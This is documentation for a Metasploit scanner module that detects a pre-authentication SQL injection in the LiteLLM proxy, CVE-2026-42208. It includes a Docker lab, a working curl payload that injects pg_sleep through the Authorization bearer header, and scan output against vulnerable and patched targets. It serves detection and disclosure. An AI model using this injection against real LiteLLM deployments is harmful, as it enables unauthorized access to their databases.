## Vulnerable Application

[LiteLLM](https://github.com/BerriAI/litellm) is an LLM gateway/proxy. Versions
**1.81.16 through 1.83.6** are affected by
[CVE-2026-42208](https://github.com/advisories/GHSA-r75f-5x8p-qvmc) (CVSS 9.3,
on the CISA KEV list), an unauthenticated SQL injection.

During API-key verification, the proxy interpolates the raw `Authorization`
bearer value into a PostgreSQL query without parameterization:

```sql
WHERE v.token = '<bearer value>'
```

LiteLLM only SHA-256-hashes bearer tokens that begin with `sk-`. A bearer value
that does **not** start with `sk-` is passed to the query verbatim, so a single
quote breaks out of the string and injects. The lookup runs on the
authentication-failure path, which is reachable **before** authentication. Fixed
in **1.83.7** by switching to a parameterized query (commit `4dc416ee74`).

This module confirms the flaw with a benign **time-based** check: a baseline
request, a `pg_sleep` payload, a second baseline (which must return quickly), and
a doubled `pg_sleep` payload. It reports the target vulnerable only when the
injected delays **scale** with the requested sleep while the controls stay fast,
so a server that is merely slow or degrading is not flagged. It never reads or
exfiltrates data.

Detection requires the target to have provisioned at least one virtual key (see
Setup). The injectable predicate is a `WHERE` clause that PostgreSQL evaluates
only against matching rows, so the time-based signal cannot fire against an empty
token table. Any LiteLLM proxy in real use has issued keys, but a freshly
initialized proxy with no keys may not respond to the probe.

### Setup with Docker

`litellm_config.yaml`:

```yaml
model_list:
  - model_name: gpt-3.5-turbo
    litellm_params:
      model: huggingface/huggingface-model
      api_key: os.environ/FAKE_API_KEY

general_settings:
  master_key: os.environ/LITELLM_MASTER_KEY
  database_url: os.environ/DATABASE_URL
```

`docker-compose.yaml` (vulnerable — DB-backed mode is what creates the token table):

```yaml
services:
  db:
    image: postgres:16
    environment:
      POSTGRES_DB: litellm
      POSTGRES_USER: litellm
      POSTGRES_PASSWORD: litellm123
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U litellm"]
      interval: 5s
      retries: 5
  litellm:
    image: litellm/litellm:main-v1.83.3-stable   # vulnerable; use main-v1.83.7-stable for the patched run
    command: ["--config", "/app/config.yaml", "--port", "4000"]
    ports:
      - "4000:4000"
    volumes:
      - ./litellm_config.yaml:/app/config.yaml:ro
    depends_on:
      db:
        condition: service_healthy
    environment:
      DATABASE_URL: "postgresql://litellm:litellm123@db:5432/litellm"
      LITELLM_MASTER_KEY: "sk-master-test-key-1234"
```

Start it and wait for the proxy to connect to PostgreSQL and apply its schema
(the `litellm_proxy_extras` migration must finish before the token table exists;
`/health/liveliness` is unauthenticated and returns 200 once the server listens):

```
docker compose up -d
until curl -sf -o /dev/null http://localhost:4000/health/liveliness; do sleep 2; done
```

**Provision at least one virtual key.** The injectable predicate is a `WHERE`
clause that PostgreSQL evaluates only against matching rows, so on a proxy whose
`LiteLLM_VerificationToken` table is empty the `pg_sleep` never executes and the
target appears (falsely) safe. Any proxy in real use has issued keys; for the lab,
create one with the master key:

```
curl -s -X POST http://localhost:4000/key/generate \
  -H 'Authorization: Bearer sk-master-test-key-1234' \
  -H 'Content-Type: application/json' -d '{}'
```

Demonstrate the delay (control vs `pg_sleep(5)`):

```
curl -s -o /dev/null -w 'control: %{time_total}s\n' -X POST http://localhost:4000/v1/chat/completions \
  -H 'Content-Type: application/json' -H 'Authorization: Bearer AAAA-control' \
  -d '{"model":"gpt-3.5-turbo","messages":[{"role":"user","content":"x"}],"max_tokens":1}'

curl -s -o /dev/null -w 'inject:  %{time_total}s\n' --max-time 30 -X POST http://localhost:4000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer ' OR (SELECT pg_sleep(5)) IS NULL --" \
  -d '{"model":"gpt-3.5-turbo","messages":[{"role":"user","content":"x"}],"max_tokens":1}'
```

Vulnerable: `control` ~0.03s, `inject` ~5s. Re-run with the `main-v1.83.7-stable`
image for the patched (true-negative) case — both return fast.

## Verification Steps

1. Start a vulnerable LiteLLM proxy with a PostgreSQL backend (see Setup with Docker)
1. Start `msfconsole`
1. Do: `use auxiliary/scanner/http/litellm_proxy_sqli`
1. Do: `set RHOSTS <target>`
1. Do: `set RPORT 4000`
1. Do: `run`
1. The module reports the injection when the response time scales with `pg_sleep`

## Options

### TARGETURI

The LiteLLM chat completions endpoint that triggers key verification. Defaults to
`/v1/chat/completions`.

### SLEEP

Base `pg_sleep` delay in seconds. The module also probes at `2 x SLEEP` and
requires the delay to scale while two control requests stay fast. Because it
issues several timed requests, a run takes roughly `3 x SLEEP` seconds per host.
Default `5`.

### MODEL

The `model` field placed in the request body. It need not be a real model — the
key lookup fails before model dispatch. Default `gpt-3.5-turbo`.

## Scenarios

Captured against the Docker lab above (vulnerable `main-v1.83.3-stable` on 4000,
patched `main-v1.83.7-stable` on 4001), each with one provisioned virtual key.

### LiteLLM 1.83.3 (vulnerable)

```
msf6 > use auxiliary/scanner/http/litellm_proxy_sqli
msf6 auxiliary(scanner/http/litellm_proxy_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(scanner/http/litellm_proxy_sqli) > set RPORT 4000
RPORT => 4000
msf6 auxiliary(scanner/http/litellm_proxy_sqli) > run

[+] 127.0.0.1:4000        - LiteLLM pre-auth SQL injection confirmed (CVE-2026-42208): controls 0.06s/0.07s, pg_sleep(5)=5.05s, pg_sleep(10)=10.04s
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### LiteLLM 1.83.7 (patched, true-negative)

```
msf6 auxiliary(scanner/http/litellm_proxy_sqli) > set RPORT 4001
RPORT => 4001
msf6 auxiliary(scanner/http/litellm_proxy_sqli) > run

[*] 127.0.0.1:4001        - Not vulnerable (pg_sleep(5) returned in 0.02s vs baseline 0.01s)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
